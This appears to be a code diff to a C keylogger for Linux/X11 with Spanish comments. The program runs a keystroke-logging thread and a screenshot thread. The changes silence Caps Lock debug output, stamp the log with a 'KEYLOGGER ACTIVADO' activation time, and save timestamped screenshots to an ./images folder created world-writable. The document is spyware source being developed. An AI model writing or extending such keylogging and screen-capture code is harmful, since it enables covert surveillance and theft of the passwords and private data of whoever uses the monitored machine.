@@ -9,6 +9,8 @@
 #include <time.h> // Para obtener la fecha y hora
 #include <assert.h>
 #include <pthread.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 
 // LIBRERIAS EXTERNAS
 #include <X11/XKBlib.h> //-lX11
@@ -57,8 +59,8 @@ int getCapsLock()
         return -2; // Retorna -2 si ocurre un error al obtener el estado
 
     // Imprime si Caps Lock está activado o desactivado
-    printf("Caps Lock is %s\n", (state & 1) ? "on" : "off");
-    printf("%d\n", state);
+    // printf("Caps Lock is %s\n", (state & 1) ? "on" : "off");
+    // printf("%d\n", state);
 
     // Cierra la conexión con el servidor X
     XCloseDisplay(display);
@@ -299,6 +301,21 @@ void *keylogger()
         return NULL;
     }
 
+    time_t now;
+    struct tm *local_time;
+
+    // Obtener la fecha y hora actuales
+    time(&now);
+    local_time = localtime(&now);
+
+    fprintf(logfile, "KEYLOGGER ACTIVADO: %04d-%02d-%02d_%02d-%02d-%02d\n", local_time->tm_year + 1900,
+            local_time->tm_mon + 1,
+            local_time->tm_mday,
+            local_time->tm_hour,
+            local_time->tm_min,
+            local_time->tm_sec);
+    fflush(logfile);
+
     // BUCLE PARA LEER LOS EVENTOS
     while (true)
     {
@@ -344,7 +361,9 @@ void *takeScreenshot()
         // Obtener la fecha y hora actuales
         time(&now);
         local_time = localtime(&now);
-        snprintf(output_file, sizeof(output_file), "image_%04d-%02d-%02d_%02d-%02d-%02d.png",
+
+        mkdir("./images", 0777); // Crea la carpeta si no existe
+        snprintf(output_file, sizeof(output_file), "./images/image_%04d-%02d-%02d_%02d-%02d-%02d.png",
                  local_time->tm_year + 1900,
                  local_time->tm_mon + 1,
                  local_time->tm_mday,
